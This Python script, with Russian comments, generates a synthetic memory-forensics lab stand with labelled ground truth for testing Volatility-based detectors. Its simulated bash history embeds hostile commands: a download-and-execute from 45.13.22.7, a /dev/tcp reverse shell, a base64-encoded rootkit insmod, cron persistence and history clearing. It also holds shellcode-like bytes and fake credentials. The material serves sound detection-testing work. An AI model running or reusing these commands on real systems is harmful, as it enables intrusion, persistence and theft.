# -*- coding: utf-8 -*-
"""Лабораторный стенд с эталонной разметкой (ground truth) для главы 3.

Генерирует:
  * синтетический образ памяти с внедрёнными и ПРОМАРКИРОВАННЫМИ артефактами
    (баннер ядра, история команд, секретные данные, области с инъекциями);
  * фикстуры вывода плагинов Volatility 3 в фактическом формате JSON-рендерера
    (проверено по volatility3 2.28.x): pslist / psscan / bash / malware.malfind;
  * выгруженные области памяти (аналог malfind --dump);
  * карту областей памяти для атрибуции находок процессам;
  * ground_truth.json — эталон, с которым сверяются детекторы;
  * локальный справочник хешей для offline-проверки репутации.

Стенд нужен потому, что на реальном дампе неизвестно, что именно в нём есть:
без эталонной разметки невозможно посчитать полноту и точность детектирования.
Сценарий воспроизводит компрометацию хоста: обратная оболочка, загрузчик,
LKM-руткит, сокрытый процесс, утечка ключей и токенов + «чистые» двойники
для измерения ложных срабатываний.

Запуск:  python3 -m lab.make_stand --out build/lab --size-mib 128
"""
from __future__ import annotations

import argparse
import json
import os
import random
import struct

KERNEL = "6.17.0-19-generic"
BANNER = (f"Linux version {KERNEL} (buildd@lcy02-amd64-073) "
          "(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0) "
          "#20~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 24 12:00:00 UTC 2025")
DECOY_BANNER = "Linux version 5.15.0-25-generic (buildd@ubuntu) (gcc 11.2.0) #25-Ubuntu SMP"

# --- сценарий: команды истории bash ------------------------------------------
MALICIOUS_COMMANDS = [
    ("2026-11-14T20:14:02+00:00", "wget -qO- http://45.13.22.7/stage.sh | sh"),
    ("2026-11-14T20:14:19+00:00", "chmod +x /tmp/.x/kworker"),
    ("2026-11-14T20:14:41+00:00", "bash -i >& /dev/tcp/45.13.22.7/4444 0>&1"),
    ("2026-11-14T20:15:03+00:00",
     "echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28K | base64 -d | sh"),
    ("2026-11-14T20:15:22+00:00", "insmod /tmp/.hide/diamorphine.ko"),
    ("2026-11-14T20:16:10+00:00",
     'crontab -l | { cat; echo "* * * * * /tmp/.x/kworker"; } | crontab -'),
    ("2026-11-14T20:16:31+00:00", "history -c"),
]
BENIGN_COMMANDS = [
    ("2026-11-14T19:58:11+00:00",
     "wget https://archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_9.1.0-1ubuntu1_amd64.deb"),
    ("2026-11-14T20:01:44+00:00", "chmod +x ./configure"),
    ("2026-11-14T20:03:02+00:00",
     "curl https://raw.githubusercontent.com/volatilityfoundation/volatility3/master/README.md"),
    ("2026-11-14T20:05:19+00:00",
     "sudo apt install linux-image-unsigned-6.17.0-19-generic-dbgsym"),
    ("2026-11-14T20:07:51+00:00", "python3 -m venv .venv"),
    ("2026-11-14T20:09:30+00:00", "man 3 crypt"),
    ("2026-11-14T20:11:07+00:00", 'git commit -m "entropy prefilter for malfind regions"'),
]

# --- сценарий: секретные данные в памяти процесса python3 (PID 3100) ---------
FAKE_PEM = (
    "-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEAx7Qm1pV0k9Zr4nT8sW2vB6yH3jL5dF7gK9mN1pQ3rS5tU7w\n"
    "Y9zA1bC3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7bC9dE1fG3hI5jK7lM9n\n"
    "O1pQ3rS5tU7wY9zA1bC3dE5fG7hI9jK1lM3nO5pQ7rS9tU1vW3xY5zA7bC9dE1f\n"
    "-----END RSA PRIVATE KEY-----\n"
)
FAKE_SECRETS = [
    "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
    "aws_secret_access_key = wJalrXUtnFEMI7K7MDENGbPxRfiCYEXAMPLEKEY",
    "GITHUB_TOKEN=ghp_16C7e42F292c6912E7710c838347Ae178B4a",
    "SLACK_TOKEN=xoxb-2785493712-4820371928-AbCdEfGhIjKlMnOpQrStUvWx",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
    "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "DATABASE_URL=postgresql://svc_report:Str0ngPassw0rd@db01.internal:5432/metrics",
    "nikita:$6$ru7Oa3Xe$K1j2L3m4N5o6P7q8R9s0T1u2V3w4X5y6Z7a8B9c0D1e2F3g4H5i6J7k8L9m0"
    ":19800:0:99999:7:::",
]
# «чистые» двойники: documentation-фрагменты, которые НЕ должны детектироваться
BENIGN_DOC = [
    "crypt(3) manual page: the hash format is $id$salt$encrypted, e.g. $6$rounds=5000$salt$hash",
    "Example configuration: password_hash = $6$rounds=656000$SALT$HASH  (see man 3 crypt)",
    "To generate a key run: ssh-keygen -t ed25519. Output starts with "
    "-----BEGIN OPENSSH PRIVATE KEY----- followed by base64 body.",
    "README: export AWS_ACCESS_KEY_ID=AKIA... (placeholder, not a real credential)",
    "nginx: [notice] 1450#0: using the \"epoll\" event method",
    "nginx: [info] 1451#0: *12 client 10.0.0.15 closed keepalive connection",
]

FILLER = (
    "The quick brown fox jumps over the lazy dog. "
    "Linux memory forensics laboratory stand filler block. "
    "Volatility 3 symbol tables are generated from DWARF debug info. "
)


def _shellcode_region(rng: random.Random, size: int) -> bytes:
    """Область с признаками shellcode и высокой энтропией (имитация нагрузки)."""
    head = bytes.fromhex("6a2958996a025f6a015e")            # socket(AF_INET, SOCK_STREAM)
    head += bytes.fromhex("4831c04831ff4831f64831d2")      # xor rax/rdi/rsi/rdx
    head += b"\x0f\x05" + b"/bin/sh\x00"
    body = bytes(rng.getrandbits(8) for _ in range(size - len(head)))
    return head + body


def _packed_region(rng: random.Random, size: int) -> bytes:
    """ELF-образ с признаками упаковщика в анонимной области."""
    head = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
    head += struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0x401000, 64, 0, 0, 64, 56, 3, 64, 0, 0)
    head += b"UPX! 3.96\x00This file is packed with the UPX executable packer\x00"
    body = bytes(rng.getrandbits(8) for _ in range(size - len(head)))
    return head + body


def build(out_dir: str, size_mib: int = 128, seed: int = 20261114) -> dict:
    rng = random.Random(seed)
    os.makedirs(out_dir, exist_ok=True)
    regions_dir = os.path.join(out_dir, "regions")
    fixtures_dir = os.path.join(out_dir, "plugins")
    os.makedirs(regions_dir, exist_ok=True)
    os.makedirs(fixtures_dir, exist_ok=True)

    image_path = os.path.join(out_dir, "memory_lab.raw")
    total = size_mib * (1 << 20)

    # --- раскладка образа (физические смещения) ------------------------------
    OFF_BANNER = 0x1000
    OFF_BASH = 0x0010_0000
    OFF_HEAP = 0x0040_0000
    OFF_REG_A = 0x0080_0000     # 4242: shellcode + высокая энтропия
    OFF_REG_B = 0x0090_0000     # 4242: нулевая область (отсев)
    OFF_REG_C = 0x00A0_0000     # 1450: RWX с текстом (ложное срабатывание malfind)
    OFF_REG_D = 0x00B0_0000     # 4242: упакованный ELF

    SIZE_A, SIZE_B, SIZE_C, SIZE_D = 96 << 10, 64 << 10, 32 << 10, 48 << 10
    VMA_A, VMA_B, VMA_C, VMA_D = 0x7f0000000000, 0x7f0000100000, 0x7f1000000000, 0x7f0000300000

    banner_block = (BANNER + "\x00").encode() * 6 + (DECOY_BANNER + "\x00").encode()
    bash_block = b"".join((c + "\x00").encode() for _, c in MALICIOUS_COMMANDS + BENIGN_COMMANDS)
    heap_block = (FAKE_PEM + "\n".join(FAKE_SECRETS) + "\n" + "\n".join(BENIGN_DOC)).encode()
    benign_offsets = {}
    for line in (BENIGN_DOC[0], BENIGN_DOC[2]):
        pos = heap_block.find(line.encode())
        if pos >= 0:
            benign_offsets[line] = (OFF_HEAP + pos, OFF_HEAP + pos + len(line.encode()))
    reg_a = _shellcode_region(rng, SIZE_A)
    reg_b = b"\x00" * SIZE_B
    reg_c = ("\n".join(BENIGN_DOC[4:] + [FILLER * 40])).encode()[:SIZE_C].ljust(SIZE_C, b" ")
    reg_d = _packed_region(rng, SIZE_D)

    with open(image_path, "wb") as fh:
        fh.truncate(total)
        for off, blob in ((OFF_BANNER, banner_block), (OFF_BASH, bash_block),
                          (OFF_HEAP, heap_block), (OFF_REG_A, reg_a), (OFF_REG_B, reg_b),
                          (OFF_REG_C, reg_c), (OFF_REG_D, reg_d)):
            fh.seek(off)
            fh.write(blob)
        # низкоэнтропийный фон остального образа
        fh.seek(0x00C0_0000)
        chunk = (FILLER * 8192).encode()
        written = 0x00C0_0000
        while written < total:
            fh.write(chunk[: min(len(chunk), total - written)])
            written += len(chunk)

    # --- выгруженные области (аналог malfind --dump) -------------------------
    region_files = {}
    for pid, vma, blob in ((4242, VMA_A, reg_a), (4242, VMA_B, reg_b),
                           (1450, VMA_C, reg_c), (4242, VMA_D, reg_d)):
        name = f"pid.{pid}.vma.{hex(vma)}.{hex(vma + len(blob))}.dmp"
        path = os.path.join(regions_dir, name)
        with open(path, "wb") as fh:
            fh.write(blob)
        region_files[(pid, vma)] = path

    # --- процессы -----------------------------------------------------------
    def task(off, pid, tid, ppid, comm, uid=1000, created="2026-11-14T19:55:00+00:00"):
        return {"OFFSET (V)": off, "PID": pid, "TID": tid, "PPID": ppid, "COMM": comm,
                "UID": uid, "GID": uid, "EUID": uid, "EGID": uid,
                "CREATION TIME": created, "File output": "Disabled", "__children": []}

    pslist = [
        task(0xffff8a01_00001000, 1, 1, 0, "systemd", 0),
        task(0xffff8a01_00002000, 2, 2, 0, "kthreadd", 0),
        task(0xffff8a01_00003000, 910, 910, 1, "sshd", 0),
        task(0xffff8a01_00004000, 1450, 1450, 1, "nginx", 33),
        task(0xffff8a01_00005000, 2100, 2100, 910, "bash"),
        task(0xffff8a01_00006000, 3100, 3100, 2100, "python3"),
        task(0xffff8a01_00007000, 3300, 3300, 2100, "defunct"),
        task(0xffff8a01_00008000, 4100, 4100, 1, "kworker/u8:2", 0),
        task(0xffff8a01_00009000, 4300, 4300, 2100, "vol.py"),
    ]
    # потоки легитимных многопоточных процессов: есть в psscan, нет в pslist
    threads = [
        task(0xffff8a01_0000a000, 1450, 1451, 1, "nginx", 33),
        task(0xffff8a01_0000b000, 1450, 1452, 1, "nginx", 33),
        task(0xffff8a01_0000c000, 3100, 3101, 2100, "python3"),
        task(0xffff8a01_0000d000, 3100, 3102, 2100, "python3"),
        task(0xffff8a01_0000e000, 3100, 3103, 2100, "python3"),
        task(0xffff8a01_0000f000, 4300, 4301, 2100, "vol.py"),
    ]
    hidden_task = task(0xffff8a01_0001f000, 4242, 4242, 1, "kworker/u8:3", 0,
                       "2026-11-14T20:14:05+00:00")

    def scan_row(t, exit_state="TASK_RUNNING"):
        return {"OFFSET (P)": t["OFFSET (V)"] - 0xffff8a01_00000000 + 0x1_0000_0000,
                "PID": t["PID"], "TID": t["TID"], "PPID": t["PPID"], "COMM": t["COMM"],
                "EXIT_STATE": exit_state, "__children": []}

    psscan = [scan_row(t) for t in pslist if t["COMM"] != "defunct"]
    psscan += [scan_row(next(t for t in pslist if t["COMM"] == "defunct"), "EXIT_ZOMBIE")]
    psscan += [scan_row(t) for t in threads]
    psscan += [scan_row(hidden_task)]                       # сокрытый процесс (DKOM)
    psscan += [scan_row(task(0xffff8a01_0002f000, 3350, 3350, 2100, "sleep"), "EXIT_DEAD")]

    bash_rows = [{"PID": 2100, "Process": "bash", "CommandTime": ts, "Command": cmd,
                  "__children": []}
                 for ts, cmd in sorted(MALICIOUS_COMMANDS + BENIGN_COMMANDS)]

    malfind_rows = []
    for pid, proc, vma, blob, protection in (
            (4242, "kworker/u8:3", VMA_A, reg_a, "rwx"),
            (4242, "kworker/u8:3", VMA_B, reg_b, "rwx"),
            (1450, "nginx", VMA_C, reg_c, "rwx"),
            (4242, "kworker/u8:3", VMA_D, reg_d, "rwx")):
        malfind_rows.append({
            "PID": pid, "Process": proc, "Start": vma, "End": vma + len(blob),
            "Path": "", "Protection": protection,
            "Hexdump": blob[:64].hex(" "), "Disasm": "0x%x: nop" % vma,
            "File output": region_files[(pid, vma)], "__children": []})

    for name, rows in (("linux_pslist", pslist), ("linux_psscan", psscan),
                       ("linux_bash", bash_rows), ("linux_malware_malfind", malfind_rows)):
        with open(os.path.join(fixtures_dir, name + ".json"), "w", encoding="utf-8") as fh:
            json.dump(rows, fh, ensure_ascii=False, indent=1)

    # --- карта областей памяти: атрибуция находок процессам ------------------
    memory_map = [
        {"pid": 2, "process": "kthreadd", "offset": OFF_BANNER, "size": len(banner_block)},
        {"pid": 2100, "process": "bash", "offset": OFF_BASH, "size": len(bash_block)},
        {"pid": 3100, "process": "python3", "offset": OFF_HEAP, "size": len(heap_block)},
        {"pid": 4242, "process": "kworker/u8:3", "offset": OFF_REG_A, "size": SIZE_A},
        {"pid": 4242, "process": "kworker/u8:3", "offset": OFF_REG_B, "size": SIZE_B},
        {"pid": 1450, "process": "nginx", "offset": OFF_REG_C, "size": SIZE_C},
        {"pid": 4242, "process": "kworker/u8:3", "offset": OFF_REG_D, "size": SIZE_D},
    ]
    with open(os.path.join(out_dir, "memory_map.json"), "w", encoding="utf-8") as fh:
        json.dump(memory_map, fh, ensure_ascii=False, indent=1)

    # --- эталонная разметка -------------------------------------------------
    from hashlib import sha256
    truth = {
        "stand": "LMA lab stand (синтетический образ с внедрёнными артефактами)",
        "kernel": KERNEL,
        "seed": seed,
        "hidden_processes": [{"pid": 4242, "comm": "kworker/u8:3",
                              "note": "лидер группы, TASK_RUNNING, отсутствует в pslist"}],
        "malicious_commands": [{"command": c, "timestamp": ts} for ts, c in MALICIOUS_COMMANDS],
        "injected_regions": [
            {"pid": 4242, "start": VMA_A, "note": "shellcode + высокоэнтропийная нагрузка"},
            {"pid": 4242, "start": VMA_D, "note": "упакованный ELF в анонимной области"}],
        "yara_findings": [
            {"rule": "Linux_Malware_Reverse_Shell", "pid": 2100},
            {"rule": "Linux_Malware_Download_And_Execute", "pid": 2100},
            {"rule": "Linux_Malware_Encoded_Payload_Exec", "pid": 2100},
            {"rule": "Linux_Malware_AntiForensics_History", "pid": 2100},
            {"rule": "Linux_Malware_Kernel_Module_Loader", "pid": 2100},
            {"rule": "Linux_Secret_Private_Key_PEM", "pid": 3100},
            {"rule": "Linux_Secret_Cloud_Token", "pid": 3100},
            {"rule": "Linux_Secret_Shadow_Hash", "pid": 3100},
            {"rule": "Linux_Secret_DB_Connection_String", "pid": 3100},
            {"rule": "Linux_Injection_Shellcode_Socket_x64", "pid": 4242},
            {"rule": "Linux_Injection_ELF_Header_In_Anon_VMA", "pid": 4242},
            {"rule": "Linux_Injection_Packed_High_Entropy", "pid": 4242}],
        "benign_lookalikes": [
            {"command": BENIGN_COMMANDS[0][1], "note": "загрузка пакета из доверенного репозитория"},
            {"command": BENIGN_COMMANDS[1][1], "note": "chmod +x в контексте сборки"},
            {"command": BENIGN_COMMANDS[2][1], "note": "curl к доверенному источнику"},
            {"rule": "Linux_Secret_Shadow_Hash", "pid": 3100,
             "offset": benign_offsets[BENIGN_DOC[0]][0],
             "end": benign_offsets[BENIGN_DOC[0]][1],
             "note": "фрагмент man 3 crypt без структуры строки shadow"},
            {"rule": "Linux_Secret_Private_Key_PEM", "pid": 3100,
             "offset": benign_offsets[BENIGN_DOC[2]][0],
             "end": benign_offsets[BENIGN_DOC[2]][1],
             "note": "заголовок PEM в тексте README без тела ключа"},
            {"pid": 1450, "start": VMA_C,
             "note": "легитимная RWX-область с текстом (ложный кандидат malfind)"}],
    }
    with open(os.path.join(out_dir, "ground_truth.json"), "w", encoding="utf-8") as fh:
        json.dump(truth, fh, ensure_ascii=False, indent=1)

    # --- локальный справочник хешей (offline-репутация) ----------------------
    ref_path = os.path.join(out_dir, "reference_hashes.txt")
    with open(ref_path, "w", encoding="utf-8") as fh:
        fh.write("# локальный справочник стенда (НЕ ответ MalwareBazaar)\n")
        fh.write("# sha256 verdict signature\n")
        fh.write(f"{sha256(reg_a).hexdigest()} malicious Lab.Loader.Shellcode\n")
        fh.write(f"{sha256(reg_d).hexdigest()} suspicious Lab.Packed.UPX\n")

    manifest = {
        "image": image_path, "size_bytes": total, "fixtures": fixtures_dir,
        "regions": regions_dir, "memory_map": os.path.join(out_dir, "memory_map.json"),
        "ground_truth": os.path.join(out_dir, "ground_truth.json"),
        "reference_hashes": ref_path,
        "layout": {"banner": OFF_BANNER, "bash": OFF_BASH, "heap": OFF_HEAP,
                   "region_a": OFF_REG_A, "region_b": OFF_REG_B,
                   "region_c": OFF_REG_C, "region_d": OFF_REG_D},
        "counts": {"pslist": len(pslist), "psscan": len(psscan),
                   "bash": len(bash_rows), "malfind": len(malfind_rows)},
    }
    with open(os.path.join(out_dir, "manifest.json"), "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, ensure_ascii=False, indent=1)
    return manifest


def main():
    ap = argparse.ArgumentParser(description="Генератор лабораторного стенда LMA")
    ap.add_argument("--out", default="build/lab")
    ap.add_argument("--size-mib", type=int, default=128)
    ap.add_argument("--seed", type=int, default=20261114)
    args = ap.parse_args()
    man = build(args.out, args.size_mib, args.seed)
    print(f"[+] Стенд развёрнут: {args.out}")
    print(f"    образ памяти      : {man['image']} ({man['size_bytes'] / (1 << 20):.0f} МиБ)")
    print(f"    фикстуры плагинов : {man['fixtures']} "
          f"(pslist {man['counts']['pslist']}, psscan {man['counts']['psscan']}, "
          f"bash {man['counts']['bash']}, malfind {man['counts']['malfind']})")
    print(f"    эталонная разметка: {man['ground_truth']}")
    print(f"    справочник хешей  : {man['reference_hashes']}")


if __name__ == "__main__":
    main()
